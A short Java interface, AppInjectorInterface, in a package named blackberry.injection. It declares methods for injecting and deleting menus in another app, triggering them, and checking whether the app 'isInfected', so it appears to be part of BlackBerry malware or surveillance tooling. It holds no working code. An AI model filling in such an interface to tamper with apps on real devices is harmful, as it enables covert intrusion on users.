package blackberry.injection;

public interface AppInjectorInterface {

    boolean injectMenu();

    boolean deleteMenu();

    boolean callMenuByKey(int type);

    String getAppName();

    void callMenuInContext();

    boolean isInfected();

}
